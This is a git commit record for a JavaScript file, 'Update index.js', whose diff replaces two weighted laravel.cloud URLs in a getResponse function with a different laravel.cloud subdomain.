64220b1d279a00541d56a3a6e61026b964093d26
animalinside <akshay.anand12@yahoo.com>
2026-05-19 06:44:05 +0530

    Update index.js

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://laravel-1-copp-jd6krx.laravel.cloud/", weight: 0.5 },
-        { url: "https://laravel-1-copp-jd6krx.laravel.cloud/", weight: 0.5 }
+        { url: "https://laravel-1-niuii-obx70b.laravel.cloud/", weight: 0.5 },
+        { url: "https://laravel-1-niuii-obx70b.laravel.cloud/", weight: 0.5 }
       
     ];
 
